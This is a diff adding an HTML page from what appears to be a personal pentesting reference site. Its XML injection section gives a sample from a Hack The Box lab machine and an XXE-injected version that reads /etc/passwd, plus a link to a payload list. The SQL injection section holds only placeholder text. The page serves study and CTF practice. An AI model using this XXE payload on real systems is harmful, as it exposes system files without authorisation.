@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Pentesting Ref | examples</title>
+  <link rel="stylesheet" href="css/style_examples.css">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+	<main>
+		<h2>injections</h2>
+
+		<div class="box">
+			<h3>XML injection</h3>
+			<p>Example from a htb machine (bounty hunter): </p>
+			<code class="etc">
+				&lt?xml  version="1.0" encoding="ISO-8859-1"?&gt <br>
+				&ltbugreport&gt <br>
+				&lttitle&gt RCE &lt/title&gt <br>
+				&ltcwe&gt CWE-434 &lt/cwe&gt <br>
+				&ltcvss&gt 9 &lt/cvss&gt <br>
+				&ltreward&gt 100 &lt/reward&gt <br>
+				&lt/bugreport&gt
+			</code>
+			<p>Injected version, using file desclosure method: </p>
+			<code class="etc">
+				&lt?xml  version="1.0" encoding="ISO-8859-1"?&gt <br>
+				&lt!DOCTYPE foo [ &lt!ENTITY xxe SYSTEM "file:///etc/passwd"&gt ]&gt <br>
+				&ltbugreport&gt <br>
+				&lttitle&gt &xxe; &lt/title&gt <br>
+				&ltcwe&gt CWE-434 &lt/cwe&gt <br>
+				&ltcvss&gt 9 &lt/cvss&gt <br>
+				&ltreward&gt 100 &lt/reward&gt <br>
+				&lt/bugreport&gt
+			</code>
+			<p>repair how we use <code class="inline etc">xxe</code> to get the passwd file, and the same name in <code class="inline etc"> &lttitle&gt &xxe; &lt/title&gt</code> to display the file requested</p>
+			<a href="https://github.com/payloadbox/xxe-injection-payload-list">xml payloads</a>
+		</div>
+
+		<div class="box">
+			<h3>SQL injection</h3>
+			<p>Lorem ipsum dolor sit, amet consectetur adipisicing elit. Molestias eaque enim necessitatibus a saepe? Iusto itaque at nostrum alias molestias qui quas minus odit aliquam. Alias rem aperiam ducimus optio.</p>
+		</div>
+
+	</main>
+</body>
+</html>
